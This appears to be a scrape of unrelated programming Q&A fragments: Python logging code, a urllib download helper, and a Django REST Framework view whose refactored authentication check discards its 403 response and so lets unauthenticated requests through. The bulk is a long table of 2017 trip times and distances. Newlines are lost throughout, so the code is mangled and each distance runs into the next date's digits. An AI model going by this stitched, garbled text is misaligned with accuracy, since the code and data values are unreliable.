Proof that the two handlers have different formatters : print logger.handlers print file_handler.formatter.formatException print console_formatter.formatException # logger.setLevel ( logging.DEBUG ) logger.info ( `` Logger ready . `` ) setup ( 'test.log ' ) logger = logging.getLogger ( ) logger.debug ( `` Only visible in the file . `` ) try : 1/0except ZeroDivisionError : logger.exception ( `` boom '' )"
"to_be_shuffled = [ None , ' a ' , ' b ' , ' c ' , 'd ' , ... ]"
"def download ( url , dest ) : urllib.urlretrieve ( url , dest )"
"from rest_framework import statusfrom rest_framework.decorators import api_viewfrom rest_framework.response import Response @ api_view ( [ 'GET ' ] ) def analytics_filter_values ( request ) : if request.user.is_authenticated ( ) : pass else : return Response ( `` Unauthorized access '' , status=status.HTTP_403_FORBIDDEN ) ... .. < business logic > ... ... ... . from rest_framework import statusfrom rest_framework.decorators import api_viewfrom rest_framework.response import Responsedef check_authentication ( request ) : if request.user.is_authenticated ( ) : passelse : return Response ( `` Unauthorized access '' , status=status.HTTP_403_FORBIDDEN ) @ api_view ( [ 'GET ' ] ) def analytics_filter_values ( request ) : check_authentication ( request ) ... .. < business logic > ... ... ... ."
trip_start trip_stop dist2017-04-01 17:42:00 2017-04-01 18:34:00 1.952017-04-01 18:42:00 2017-04-01 19:05:00 6.542017-04-02 01:09:00 2017-04-02 01:12:00 1.072017-04-02 01:22:00 2017-04-02 01:27:00 1.032017-04-02 08:17:00 2017-04-02 08:23:00 1.982017-04-02 11:23:00 2017-04-02 11:30:00 1.982017-04-02 15:44:00 2017-04-02 15:56:00 4.152017-04-02 16:29:00 2017-04-02 16:45:00 4.082017-04-03 10:24:00 2017-04-03 10:55:00 19.762017-04-03 14:01:00 2017-04-03 14:18:00 8.212017-04-03 14:25:00 2017-04-03 14:31:00 1.492017-04-03 14:45:00 2017-04-03 14:50:00 1.592017-04-03 15:44:00 2017-04-03 16:10:00 4.442017-04-03 16:14:00 2017-04-03 16:37:00 9.962017-04-03 16:40:00 2017-04-03 16:45:00 0.72017-04-03 17:15:00 2017-04-03 17:46:00 16.922017-04-03 17:56:00 2017-04-03 18:19:00 5.232017-04-03 18:42:00 2017-04-03 18:45:00 0.492017-04-03 19:02:00 2017-04-03 19:04:00 0.482017-04-04 07:24:00 2017-04-04 07:27:00 0.662017-04-04 07:30:00 2017-04-04 08:04:00 13.552017-04-04 08:32:00 2017-04-04 09:25:00 25.092017-04-04 13:32:00 2017-04-04 13:40:00 3.062017-04-04 13:52:00 2017-04-04 13:57:00 1.32017-04-04 14:55:00 2017-04-04 15:01:00 2.472017-04-04 18:40:00 2017-04-04 19:12:00 22.712017-04-04 22:16:00 2017-04-04 23:54:00 38.282017-04-04 23:59:00 2017-04-05 00:03:00 1.022017-04-05 11:04:00 2017-04-05 11:49:00 25.732017-04-05 12:05:00 2017-04-05 12:18:00 2.972017-04-05 15:19:00 2017-04-05 16:25:00 25.132017-04-05 16:38:00 2017-04-05 16:40:00 0.412017-04-05 18:58:00 2017-04-05 19:02:00 1.252017-04-05 19:13:00 2017-04-05 19:18:00 1.092017-04-05 19:25:00 2017-04-05 19:48:00 6.632017-04-06 10:01:00 2017-04-06 10:44:00 20.812017-04-06 13:22:00 2017-04-06 13:33:00 1.632017-04-06 20:58:00 2017-04-06 21:25:00 24.852017-04-06 21:32:00 2017-04-06 21:56:00 6.062017-04-07 10:55:00 2017-04-07 11:37:00 24.532017-04-07 17:14:00 2017-04-07 17:48:00 19.662017-04-07 17:57:00 2017-04-07 18:07:00 2.122017-04-08 20:57:00 2017-04-08 21:06:00 1.062017-04-08 21:23:00 2017-04-08 21:36:00 2.972017-04-09 08:14:00 2017-04-09 08:19:00 1.992017-04-09 11:40:00 2017-04-09 11:50:00 2.242017-04-09 11:50:00 2017-04-09 11:57:00 1.642017-04-09 16:29:00 2017-04-09 16:34:00 0.532017-04-09 16:43:00 2017-04-09 16:45:00 0.52017-04-09 17:46:00 2017-04-09 17:48:00 0.442017-04-09 17:53:00 2017-04-09 17:56:00 0.42017-04-09 21:33:00 2017-04-09 21:56:00 2.482017-04-09 21:57:00 2017-04-09 22:14:00 2.922017-04-09 22:22:00 2017-04-09 22:25:00 0.92017-04-10 10:37:00 2017-04-10 11:22:00 19.272017-04-10 16:12:00 2017-04-10 16:59:00 21.312017-04-11 11:14:00 2017-04-11 11:18:00 1.242017-04-11 11:21:00 2017-04-11 11:48:00 22.952017-04-11 18:24:00 2017-04-11 19:05:00 28.642017-04-11 19:21:00 2017-04-11 19:34:00 5.372017-04-12 11:00:00 2017-04-12 12:08:00 28.912017-04-12 14:03:00 2017-04-12 15:20:00 28.562017-04-12 20:24:00 2017-04-12 20:29:00 1.172017-04-12 20:32:00 2017-04-12 21:09:00 30.892017-04-13 01:37:00 2017-04-13 02:09:00 32.32017-04-13 08:08:00 2017-04-13 08:39:00 19.392017-04-13 10:53:00 2017-04-13 11:23:00 24.592017-04-13 18:56:00 2017-04-13 19:22:00 22.742017-04-14 01:06:00 2017-04-14 01:37:00 31.362017-04-14 01:48:00 2017-04-14 01:51:00 1.032017-04-14 12:08:00 2017-04-14 12:22:00 1.942017-04-14 12:29:00 2017-04-14 13:01:00 19.072017-04-14 16:17:00 2017-04-14 17:03:00 19.742017-04-14 17:05:00 2017-04-14 17:32:00 3.992017-04-14 21:57:00 2017-04-14 22:02:00 1.982017-04-15 01:46:00 2017-04-15 01:49:00 1.072017-04-15 01:56:00 2017-04-15 01:58:00 1.032017-04-15 07:13:00 2017-04-15 07:15:00 0.452017-04-15 07:19:00 2017-04-15 07:21:00 0.412017-04-15 15:54:00 2017-04-15 16:05:00 1.942017-04-15 22:23:00 2017-04-15 22:26:00 0.862017-04-15 22:46:00 2017-04-15 22:47:00 0.252017-04-15 22:51:00 2017-04-15 22:53:00 0.712017-04-16 11:35:00 2017-04-16 11:54:00 11.42017-04-16 11:58:00 2017-04-16 12:15:00 10.432017-04-17 10:44:00 2017-04-17 10:53:00 3.042017-04-17 10:55:00 2017-04-17 11:22:00 18.262017-04-17 18:09:00 2017-04-17 18:12:00 0.852017-04-17 18:21:00 2017-04-17 19:07:00 37.222017-04-18 02:07:00 2017-04-18 02:47:00 32.412017-04-18 10:55:00 2017-04-18 10:57:00 0.412017-04-18 11:02:00 2017-04-18 11:12:00 2.32017-04-18 11:15:00 2017-04-18 11:52:00 24.052017-04-18 16:59:00 2017-04-18 17:55:00 22.662017-04-19 00:46:00 2017-04-19 01:35:00 39.252017-04-19 10:57:00 2017-04-19 11:44:00 24.062017-04-19 13:23:00 2017-04-19 14:10:00 25.962017-04-19 16:21:00 2017-04-19 17:07:00 18.052017-04-19 23:32:00 2017-04-20 00:19:00 39.672017-04-20 10:47:00 2017-04-20 11:13:00 24.072017-04-20 16:21:00 2017-04-20 16:30:00 0.862017-04-20 16:36:00 2017-04-20 16:58:00 0.852017-04-20 17:41:00 2017-04-20 17:44:00 0.372017-04-20 17:49:00 2017-04-20 18:40:00 19.322017-04-20 22:22:00 2017-04-20 22:53:00 29.22017-04-20 23:07:00 2017-04-20 23:27:00 10.942017-04-21 08:29:00 2017-04-21 08:40:00 1.912017-04-21 11:30:00 2017-04-21 11:32:00 0.422017-04-21 11:38:00 2017-04-21 11:40:00 0.42017-04-21 11:42:00 2017-04-21 12:15:00 19.092017-04-21 16:50:00 2017-04-21 18:17:00 40.612017-04-21 18:55:00 2017-04-21 19:11:00 1.732017-04-21 22:20:00 2017-04-21 22:53:00 28.262017-04-21 23:01:00 2017-04-21 23:22:00 11.762017-04-22 08:56:00 2017-04-22 08:58:00 0.632017-04-22 09:04:00 2017-04-22 09:08:00 0.32017-04-22 09:12:00 2017-04-22 09:15:00 0.422017-04-22 16:48:00 2017-04-22 16:52:00 0.542017-04-22 17:06:00 2017-04-22 17:09:00 0.512017-04-22 17:10:00 2017-04-22 17:13:00 1.032017-04-22 17:22:00 2017-04-22 17:27:00 1.12017-04-23 08:13:00 2017-04-23 08:15:00 0.412017-04-23 08:19:00 2017-04-23 08:20:00 0.42017-04-23 08:21:00 2017-04-23 08:25:00 1.992017-04-23 11:41:00 2017-04-23 11:48:00 2.042017-04-23 12:35:00 2017-04-23 12:50:00 7.592017-04-23 14:08:00 2017-04-23 14:21:00 7.312017-04-23 14:33:00 2017-04-23 15:38:00 37.62017-04-24 00:26:00 2017-04-24 01:18:00 39.212017-04-24 10:24:00 2017-04-24 10:26:00 0.412017-04-24 10:31:00 2017-04-24 10:35:00 1.372017-04-24 10:38:00 2017-04-24 10:43:00 1.192017-04-24 10:49:00 2017-04-24 11:15:00 19.582017-04-24 17:13:00 2017-04-24 18:20:00 37.422017-04-24 19:02:00 2017-04-24 19:08:00 1.762017-04-24 19:49:00 2017-04-24 19:55:00 1.792017-04-24 20:41:00 2017-04-24 21:16:00 32.312017-04-25 10:53:00 2017-04-25 11:25:00 24.832017-04-25 15:15:00 2017-04-25 15:24:00 3.072017-04-25 15:30:00 2017-04-25 15:40:00 3.012017-04-25 17:34:00 2017-04-25 18:18:00 24.82017-04-26 09:59:00 2017-04-26 10:28:00 24.052017-04-26 12:56:00 2017-04-26 13:40:00 29.132017-04-26 14:37:00 2017-04-26 15:34:00 212017-04-27 08:57:00 2017-04-27 10:21:00 40.562017-04-27 16:12:00 2017-04-27 16:44:00 9.892017-04-27 17:09:00 2017-04-27 18:01:00 17.512017-04-28 05:18:00 2017-04-28 06:06:00 39.282017-04-28 12:57:00 2017-04-28 13:52:00 35.822017-04-28 16:48:00 2017-04-28 18:14:00 39.12017-05-01 11:41:00 2017-05-01 12:20:00 18.742017-05-01 18:53:00 2017-05-01 19:34:00 37.152017-05-01 23:08:00 2017-05-01 23:09:00 0.062017-05-01 23:18:00 2017-05-02 00:11:00 38.612017-05-02 11:05:00 2017-05-02 11:42:00 24.072017-05-02 17:34:00 2017-05-02 18:53:00 26.422017-05-03 12:13:00 2017-05-03 12:25:00 3.962017-05-03 12:25:00 2017-05-03 12:56:00 21.152017-05-03 13:26:00 2017-05-03 13:44:00 3.322017-05-03 13:57:00 2017-05-03 14:08:00 3.492017-05-03 18:39:00 2017-05-03 19:08:00 24.852017-05-03 19:09:00 2017-05-03 19:13:00 0.992017-05-03 19:29:00 2017-05-03 19:32:00 0.842017-05-04 10:38:00 2017-05-04 11:06:00 24.052017-05-04 13:34:00 2017-05-04 14:10:00 1.732017-05-04 17:14:00 2017-05-04 18:23:00 24.682017-05-05 20:38:00 2017-05-05 20:52:00 2.242017-05-06 11:45:00 2017-05-06 12:30:00 20.192017-05-06 14:36:00 2017-05-06 15:35:00 14.492017-05-06 15:48:00 2017-05-06 16:17:00 5.252017-05-06 17:11:00 2017-05-06 17:13:00 0.432017-05-06 17:19:00 2017-05-06 17:21:00 0.432017-05-07 08:16:00 2017-05-07 08:22:00 3.272017-05-07 12:09:00 2017-05-07 12:16:00 2.012017-05-07 17:28:00 2017-05-07 17:50:00 10.362017-05-07 17:54:00 2017-05-07 18:01:00 1.192017-05-07 18:02:00 2017-05-07 18:35:00 28.312017-05-07 21:48:00 2017-05-07 21:52:00 1.462017-05-07 22:01:00 2017-05-07 22:05:00 1.372017-05-08 00:59:00 2017-05-08 02:19:00 39.232017-05-08 11:30:00 2017-05-08 11:58:00 22.552017-05-08 18:08:00 2017-05-08 18:30:00 10.472017-05-08 18:33:00 2017-05-08 19:09:00 28.442017-05-08 22:25:00 2017-05-08 23:09:00 38.652017-05-08 23:14:00 2017-05-08 23:17:00 1.042017-05-09 11:35:00 2017-05-09 12:19:00 23.992017-05-09 17:57:00 2017-05-09 18:59:00 29.382017-05-09 20:03:00 2017-05-09 20:13:00 1.92017-05-10 10:18:00 2017-05-10 10:54:00 24.062017-05-10 15:43:00 2017-05-10 16:46:00 24.712017-05-11 12:28:00 2017-05-11 13:07:00 21.752017-05-11 18:00:00 2017-05-11 18:31:00 19.32017-05-12 08:26:00 2017-05-12 08:55:00 20.462017-05-12 13:00:00 2017-05-12 13:34:00 14.62017-05-13 08:44:00 2017-05-13 08:46:00 0.382017-05-13 08:57:00 2017-05-13 09:01:00 0.332017-05-13 14:22:00 2017-05-13 14:41:00 6.862017-05-13 15:17:00 2017-05-13 15:35:00 5.22017-05-13 18:10:00 2017-05-13 18:21:00 1.912017-05-14 11:22:00 2017-05-14 11:26:00 0.92017-05-14 11:36:00 2017-05-14 11:38:00 0.392017-05-14 14:56:00 2017-05-14 15:59:00 40.072017-05-14 16:34:00 2017-05-14 16:41:00 1.492017-05-14 16:56:00 2017-05-14 17:04:00 1.452017-05-14 19:05:00 2017-05-14 20:06:00 39.212017-05-15 11:24:00 2017-05-15 11:33:00 1.912017-05-15 11:41:00 2017-05-15 12:13:00 19.842017-05-15 17:41:00 2017-05-15 18:11:00 162017-05-15 18:15:00 2017-05-15 19:23:00 31.522017-05-15 23:41:00 2017-05-16 00:26:00 39.322017-05-16 09:49:00 2017-05-16 11:02:00 24.912017-05-16 16:08:00 2017-05-16 16:32:00 3.372017-05-16 17:11:00 2017-05-16 17:32:00 4.82017-05-16 17:42:00 2017-05-16 17:56:00 1.812017-05-16 18:13:00 2017-05-16 18:46:00 24.852017-05-16 21:07:00 2017-05-16 21:10:00 1.042017-05-16 21:26:00 2017-05-16 21:29:00 1.022017-07-28 16:10:00 2017-07-28 16:17:00 2.222017-07-28 16:17:00 2017-07-28 16:42:00 7.842017-08-10 12:00:00 2017-08-10 12:44:00 24.052017-08-10 14:56:00 2017-08-10 15:10:00 1.612017-08-10 18:51:00 2017-08-10 19:21:00 24.852017-08-10 19:46:00 2017-08-10 19:56:00 1.142017-08-10 20:08:00 2017-08-10 20:12:00 1.092017-08-11 12:44:00 2017-08-11 12:49:00 0.822017-08-11 12:59:00 2017-08-11 13:01:00 0.562017-08-11 13:18:00 2017-08-11 15:12:00 1.792017-08-11 15:14:00 2017-08-11 16:53:00 34.62017-08-11 19:27:00 2017-08-11 20:34:00 34.912017-08-12 13:52:00 2017-08-12 13:56:00 1.052017-08-12 13:59:00 2017-08-12 14:02:00 0.282017-08-12 14:10:00 2017-08-12 14:30:00 1.222017-08-12 17:15:00 2017-08-12 17:36:00 11.372017-08-12 20:49:00 2017-08-12 21:05:00 10.432017-08-13 12:16:00 2017-08-13 12:44:00 12.962017-08-13 16:03:00 2017-08-13 16:32:00 14.332017-08-13 18:19:00 2017-08-13 18:42:00 9.322017-08-13 18:52:00 2017-08-13 19:05:00 3.992017-08-13 21:42:00 2017-08-13 21:53:00 5.62017-08-14 08:50:00 2017-08-14 09:45:00 24.12017-08-14 13:22:00 2017-08-14 13:54:00 24.842017-08-14 14:02:00 2017-08-14 15:34:00 36.922017-08-14 15:58:00 2017-08-14 17:17:00 35.72017-08-14 17:35:00 2017-08-14 17:45:00 1.992017-08-14 18:07:00 2017-08-14 18:27:00 9.922017-08-15 10:15:00 2017-08-15 10:51:00 252017-08-15 19:23:00 2017-08-15 19:29:00 0.42017-08-15 19:51:00 2017-08-15 20:45:00 24.392017-08-15 20:56:00 2017-08-15 21:04:00 2.782017-08-15 21:09:00 2017-08-15 21:37:00 19.222017-08-16 00:03:00 2017-08-16 00:27:00 15.512017-08-16 00:36:00 2017-08-16 00:41:00 1.232017-08-16 00:46:00 2017-08-16 01:18:00 11.352017-08-16 09:38:00 2017-08-16 09:41:00 1.212017-08-16 09:41:00 2017-08-16 09:43:00 0.082017-08-16 09:47:00 2017-08-16 10:32:00 22.892017-08-16 16:51:00 2017-08-16 17:11:00 3.142017-08-16 17:12:00 2017-08-16 17:25:00 2.762017-08-16 17:41:00 2017-08-16 18:36:00 24.782017-08-17 09:34:00 2017-08-17 10:13:00 24.032017-08-17 12:32:00 2017-08-17 13:07:00 24.822017-08-17 13:35:00 2017-08-17 13:40:00 0.42017-08-17 13:47:00 2017-08-17 15:07:00 36.062017-08-17 15:18:00 2017-08-17 15:24:00 0.062017-08-17 16:03:00 2017-08-17 18:05:00 35.162017-08-18 09:47:00 2017-08-18 10:23:00 24.472017-08-18 16:04:00 2017-08-18 16:42:00 1.632017-08-18 17:56:00 2017-08-18 18:25:00 10.742017-08-18 18:27:00 2017-08-18 18:48:00 1.852017-08-19 00:07:00 2017-08-19 00:41:00 18.922017-08-19 00:52:00 2017-08-19 00:55:00 0.992017-08-19 11:52:00 2017-08-19 12:14:00 7.562017-08-19 15:57:00 2017-08-19 16:12:00 4.022017-08-19 16:37:00 2017-08-19 16:56:00 5.322017-08-19 23:32:00 2017-08-19 23:50:00 7.542017-08-19 23:51:00 2017-08-20 00:17:00 9.592017-08-20 09:03:00 2017-08-20 09:16:00 5.222017-08-20 19:17:00 2017-08-20 19:32:00 4.692017-08-21 09:24:00 2017-08-21 09:40:00 2.312017-08-21 10:59:00 2017-08-21 11:02:00 0.472017-08-21 13:40:00 2017-08-21 15:29:00 36.092017-08-21 15:54:00 2017-08-21 16:48:00 2.242017-08-21 16:57:00 2017-08-21 18:15:00 32.32017-08-22 08:38:00 2017-08-22 09:06:00 0.652017-08-22 09:18:00 2017-08-22 09:19:00 0.042017-08-22 09:22:00 2017-08-22 10:05:00 23.492017-08-22 14:30:00 2017-08-22 15:02:00 1.72017-08-22 16:37:00 2017-08-22 17:41:00 24.82017-08-23 17:16:00 2017-08-23 18:14:00 24.012017-08-23 18:27:00 2017-08-23 18:32:00 1.052017-08-23 19:24:00 2017-08-23 20:04:00 18.142017-08-23 22:01:00 2017-08-23 22:28:00 16.332017-08-23 22:46:00 2017-08-23 22:50:00 1.042017-08-24 09:41:00 2017-08-24 09:44:00 0.022017-08-24 09:59:00 2017-08-24 10:00:00 0.022017-08-24 13:57:00 2017-08-24 15:33:00 42.512017-08-24 16:43:00 2017-08-24 17:00:00 0.072017-08-24 17:06:00 2017-08-24 17:33:00 10.012017-08-24 18:12:00 2017-08-24 19:03:00 27.672017-08-25 09:36:00 2017-08-25 09:55:00 2.632017-08-25 10:01:00 2017-08-25 10:32:00 20.922017-08-25 20:40:00 2017-08-25 21:45:00 17.412017-08-25 21:49:00 2017-08-25 22:14:00 16.022017-08-26 00:10:00 2017-08-26 02:14:00 29.772017-08-26 16:31:00 2017-08-26 16:55:00 7.152017-08-26 17:54:00 2017-08-26 18:19:00 102017-08-26 20:07:00 2017-08-26 20:08:00 0.192017-08-26 20:08:00 2017-08-26 20:11:00 1.352017-08-27 12:39:00 2017-08-27 12:54:00 12017-08-27 12:55:00 2017-08-27 13:48:00 9.292017-08-27 14:00:00 2017-08-27 14:34:00 3.862017-08-27 15:56:00 2017-08-27 16:37:00 10.452017-08-27 16:44:00 2017-08-27 16:51:00 1.82017-08-27 16:55:00 2017-08-27 17:00:00 0.682017-08-27 17:04:00 2017-08-27 17:19:00 4.962017-08-27 17:28:00 2017-08-27 17:39:00 2.332017-08-27 17:47:00 2017-08-27 18:58:00 24.192017-08-27 22:17:00 2017-08-27 22:41:00 16.242017-08-28 00:33:00 2017-08-28 01:22:00 13.622017-08-28 12:48:00 2017-08-28 12:51:00 0.472017-08-28 14:01:00 2017-08-28 14:03:00 0.42017-08-28 14:12:00 2017-08-28 15:31:00 34.862017-08-28 15:56:00 2017-08-28 17:04:00 34.472017-08-28 22:15:00 2017-08-28 22:38:00 18.572017-08-29 01:42:00 2017-08-29 02:05:00 18.882017-08-29 11:40:00 2017-08-29 11:44:00 1.042017-08-29 11:48:00 2017-08-29 12:09:00 0.032017-08-29 12:18:00 2017-08-29 12:21:00 0.032017-08-29 12:26:00 2017-08-29 12:32:00 1.052017-08-29 12:35:00 2017-08-29 13:15:00 24.052017-08-29 19:40:00 2017-08-29 19:42:00 0.352017-08-29 19:50:00 2017-08-29 20:19:00 27.722017-08-29 20:25:00 2017-08-29 20:41:00 10.422017-08-30 10:00:00 2017-08-30 10:47:00 24.252017-08-30 14:31:00 2017-08-30 14:56:00 1.682017-08-30 17:19:00 2017-08-30 17:43:00 0.042017-08-30 17:43:00 2017-08-30 17:50:00 0.292017-08-30 17:56:00 2017-08-30 18:40:00 16.852017-08-30 22:57:00 2017-08-30 23:35:00 17.312017-08-31 11:30:00 2017-08-31 11:41:00 0.432017-08-31 14:04:00 2017-08-31 14:06:00 0.412017-08-31 14:24:00 2017-08-31 14:26:00 0.682017-08-31 14:31:00 2017-08-31 15:42:00 34.882017-08-31 16:01:00 2017-08-31 17:07:00 30.452017-08-31 20:54:00 2017-08-31 21:21:00 19.62017-09-01 10:30:00 2017-09-01 10:59:00 17.632017-09-01 14:07:00 2017-09-01 15:07:00 27.452017-09-01 17:17:00 2017-09-01 17:36:00 1.932017-09-01 18:16:00 2017-09-01 19:19:00 20.582017-09-01 19:25:00 2017-09-01 19:38:00 4.82017-09-01 21:30:00 2017-09-01 21:54:00 1.942017-09-02 15:46:00 2017-09-02 16:06:00 0.992017-09-02 16:13:00 2017-09-02 16:16:00 1.012017-09-02 16:56:00 2017-09-02 16:59:00 0.422017-09-02 17:04:00 2017-09-02 17:06:00 0.42017-09-02 22:52:00 2017-09-02 22:54:00 0.072017-09-02 22:55:00 2017-09-02 23:15:00 18.622017-09-03 01:46:00 2017-09-03 02:10:00 18.92017-09-03 14:49:00 2017-09-03 15:04:00 3.142017-09-03 15:50:00 2017-09-03 16:07:00 10.172017-09-03 16:21:00 2017-09-03 16:38:00 7.792017-09-03 16:47:00 2017-09-03 16:52:00 1.112017-09-03 18:32:00 2017-09-03 18:37:00 1.22017-09-03 18:37:00 2017-09-03 18:44:00 0.912017-09-04 15:50:00 2017-09-04 15:54:00 0.422017-09-04 15:59:00 2017-09-04 16:11:00 2.32017-09-04 16:21:00 2017-09-04 16:43:00 8.312017-09-04 17:05:00 2017-09-04 17:15:00 2.542017-09-04 17:26:00 2017-09-04 17:41:00 4.522017-09-04 17:49:00 2017-09-04 18:25:00 29.552017-09-04 19:36:00 2017-09-04 19:51:00 0.932017-09-04 19:54:00 2017-09-04 19:59:00 0.52017-09-04 21:21:00 2017-09-04 21:55:00 29.372017-09-05 11:08:00 2017-09-05 11:51:00 35.52017-09-05 12:36:00 2017-09-05 13:07:00 2.292017-09-05 13:19:00 2017-09-05 13:22:00 0.512017-09-05 13:26:00 2017-09-05 14:03:00 33.092017-09-05 14:13:00 2017-09-05 15:01:00 24.032017-09-05 17:33:00 2017-09-05 18:11:00 14.552017-09-05 19:01:00 2017-09-05 19:19:00 11.312017-09-06 09:21:00 2017-09-06 09:39:00 7.732017-09-06 10:14:00 2017-09-06 10:30:00 7.752017-09-06 10:37:00 2017-09-06 11:13:00 24.132017-09-06 16:48:00 2017-09-06 17:35:00 25.32017-09-06 17:49:00 2017-09-06 17:55:00 0.182017-09-06 17:58:00 2017-09-06 18:00:00 0.392017-09-06 18:38:00 2017-09-06 19:04:00 15.932017-09-06 23:45:00 2017-09-07 00:14:00 19.452017-09-07 00:26:00 2017-09-07 00:30:00 1.012017-09-07 10:42:00 2017-09-07 11:35:00 31.742017-09-07 14:04:00 2017-09-07 14:39:00 27.382017-09-07 14:43:00 2017-09-07 14:52:00 3.062017-09-07 14:54:00 2017-09-07 16:00:00 32.962017-09-07 16:32:00 2017-09-07 16:33:00 0.072017-09-07 16:38:00 2017-09-07 17:04:00 2.312017-09-07 17:23:00 2017-09-07 18:14:00 33.032017-09-08 10:02:00 2017-09-08 10:30:00 19.732017-09-08 18:09:00 2017-09-08 18:37:00 18.972017-09-08 19:04:00 2017-09-08 19:18:00 1.872017-09-09 02:25:00 2017-09-09 02:28:00 1.12017-09-09 02:33:00 2017-09-09 02:35:00 1.052017-09-10 17:09:00 2017-09-10 17:44:00 14.252017-09-10 22:50:00 2017-09-10 22:53:00 0.252017-09-10 22:56:00 2017-09-10 22:57:00 0.022017-09-10 23:00:00 2017-09-10 23:23:00 16.182017-09-11 00:01:00 2017-09-11 00:19:00 1.832017-09-11 09:59:00 2017-09-11 10:06:00 1.912017-09-11 10:12:00 2017-09-11 10:51:00 27.492017-09-11 13:39:00 2017-09-11 14:13:00 27.232017-09-11 14:31:00 2017-09-11 15:31:00 35.452017-09-11 16:03:00 2017-09-11 17:09:00 36.012017-09-11 17:39:00 2017-09-11 18:01:00 9.882017-09-11 23:01:00 2017-09-11 23:05:00 1.142017-09-11 23:16:00 2017-09-11 23:30:00 5.932017-09-11 23:30:00 2017-09-11 23:54:00 4.942017-09-12 02:56:00 2017-09-12 04:00:00 25.872017-09-12 10:06:00 2017-09-12 10:46:00 24.842017-09-12 16:33:00 2017-09-12 17:20:00 22.432017-09-12 19:38:00 2017-09-12 20:14:00 21.792017-09-13 06:24:00 2017-09-13 06:59:00 25.842017-09-13 07:02:00 2017-09-13 07:14:00 5.772017-09-13 11:14:00 2017-09-13 11:36:00 16.262017-09-13 16:01:00 2017-09-13 16:57:00 24.792017-09-13 17:07:00 2017-09-13 17:48:00 15.942017-09-13 23:13:00 2017-09-13 23:35:00 16.732017-09-14 12:00:00 2017-09-14 12:27:00 19.712017-09-14 12:28:00 2017-09-14 12:30:00 0.182017-09-14 14:36:00 2017-09-14 15:06:00 14.982017-09-14 15:11:00 2017-09-14 15:17:00 2.992017-09-14 15:26:00 2017-09-14 16:44:00 37.482017-09-14 17:03:00 2017-09-14 18:17:00 34.182017-09-14 18:32:00 2017-09-14 18:41:00 3.032017-09-15 10:25:00 2017-09-15 10:26:00 0.052017-09-15 10:45:00 2017-09-15 10:48:00 0.292017-09-15 10:59:00 2017-09-15 11:05:00 0.32017-09-15 11:09:00 2017-09-15 11:36:00 10.822017-09-15 13:00:00 2017-09-15 13:17:00 8.372017-09-15 13:36:00 2017-09-15 14:30:00 25.192017-09-15 14:37:00 2017-09-15 15:01:00 0.452017-09-15 15:04:00 2017-09-15 16:59:00 85.512017-09-15 17:06:00 2017-09-15 18:57:00 129.722017-09-15 19:03:00 2017-09-15 20:02:00 60.962017-09-16 10:18:00 2017-09-16 10:39:00 16.042017-09-16 11:52:00 2017-09-16 12:12:00 16.682017-09-16 12:28:00 2017-09-16 13:29:00 492017-09-16 18:36:00 2017-09-16 19:30:00 45.72017-09-16 19:39:00 2017-09-16 19:47:00 2.12017-09-17 13:32:00 2017-09-17 13:41:00 2.242017-09-17 14:19:00 2017-09-17 14:48:00 14.682017-09-17 18:25:00 2017-09-17 18:26:00 0.052017-09-17 18:36:00 2017-09-17 19:03:00 12.262017-09-18 07:52:00 2017-09-18 08:03:00 2.042017-09-18 08:21:00 2017-09-18 08:56:00 37.942017-09-18 09:01:00 2017-09-18 09:53:00 65.72017-09-18 10:04:00 2017-09-18 10:34:00 39.432017-09-18 10:46:00 2017-09-18 11:07:00 14.252017-09-18 11:19:00 2017-09-18 13:29:00 138.982017-09-18 14:24:00 2017-09-18 14:26:00 0.042017-09-18 14:28:00 2017-09-18 15:23:00 35.522017-09-18 15:53:00 2017-09-18 17:49:00 36.642017-09-19 09:24:00 2017-09-19 10:22:00 24.372017-09-19 15:55:00 2017-09-19 16:53:00 15.872017-09-19 16:53:00 2017-09-19 17:20:00 0.852017-09-19 17:33:00 2017-09-19 18:06:00 10.952017-09-19 18:10:00 2017-09-19 18:34:00 8.412017-09-19 21:06:00 2017-09-19 21:10:00 1.242017-09-19 21:17:00 2017-09-19 21:21:00 1.052017-09-20 11:12:00 2017-09-20 11:16:00 1.222017-09-20 11:18:00 2017-09-20 11:59:00 24.152017-09-20 17:20:00 2017-09-20 18:07:00 24.152017-09-20 18:50:00 2017-09-20 19:17:00 16.022017-09-20 22:05:00 2017-09-20 22:32:00 17.52017-09-21 13:38:00 2017-09-21 13:44:00 0.722017-09-21 13:50:00 2017-09-21 15:26:00 35.812017-09-21 15:59:00 2017-09-21 16:15:00 8.262017-09-21 16:19:00 2017-09-21 17:32:00 28.12017-09-21 18:49:00 2017-09-21 19:25:00 16.052017-09-21 22:30:00 2017-09-21 22:59:00 16.972017-09-22 10:19:00 2017-09-22 10:21:00 0.432017-09-22 10:25:00 2017-09-22 10:26:00 0.42017-09-22 10:30:00 2017-09-22 10:54:00 19.152017-09-22 11:58:00 2017-09-22 12:02:00 1.052017-09-22 18:32:00 2017-09-22 18:59:00 20.952017-09-23 08:34:00 2017-09-23 08:51:00 1.152017-09-23 09:19:00 2017-09-23 10:31:00 37.572017-09-23 11:09:00 2017-09-23 11:23:00 5.672017-09-23 11:51:00 2017-09-23 12:15:00 4.642017-09-23 12:47:00 2017-09-23 13:40:00 8.452017-09-23 13:56:00 2017-09-23 15:08:00 34.622017-09-23 15:37:00 2017-09-23 16:07:00 1.562017-09-24 14:59:00 2017-09-24 15:02:00 0.432017-09-24 15:14:00 2017-09-24 17:09:00 6.62017-09-24 17:37:00 2017-09-24 18:01:00 7.052017-09-24 18:05:00 2017-09-24 18:07:00 0.412017-09-24 19:35:00 2017-09-24 20:31:00 25.282017-09-25 00:24:00 2017-09-25 00:26:00 0.422017-09-25 00:30:00 2017-09-25 01:10:00 23.132017-09-25 12:12:00 2017-09-25 12:38:00 19.452017-09-25 14:22:00 2017-09-25 14:50:00 19.862017-09-25 14:52:00 2017-09-25 15:54:00 35.532017-09-25 16:37:00 2017-09-25 18:17:00 34.542017-09-25 20:36:00 2017-09-25 21:08:00 28.912017-09-26 01:46:00 2017-09-26 02:21:00 26.322017-09-26 09:36:00 2017-09-26 10:18:00 24.022017-09-26 14:05:00 2017-09-26 14:39:00 25.32017-09-26 15:49:00 2017-09-26 15:58:00 1.532017-09-26 16:15:00 2017-09-26 16:22:00 1.12017-09-27 09:15:00 2017-09-27 10:16:00 24.762017-09-27 16:26:00 2017-09-27 17:49:00 35.872017-09-27 17:58:00 2017-09-27 18:46:00 27.642017-09-27 18:51:00 2017-09-27 18:59:00 2.082017-09-27 19:10:00 2017-09-27 20:17:00 21.172017-09-27 20:25:00 2017-09-27 21:56:00 3.62017-09-27 22:04:00 2017-09-27 22:32:00 16.562017-09-28 06:46:00 2017-09-28 07:19:00 14.42017-09-28 09:05:00 2017-09-28 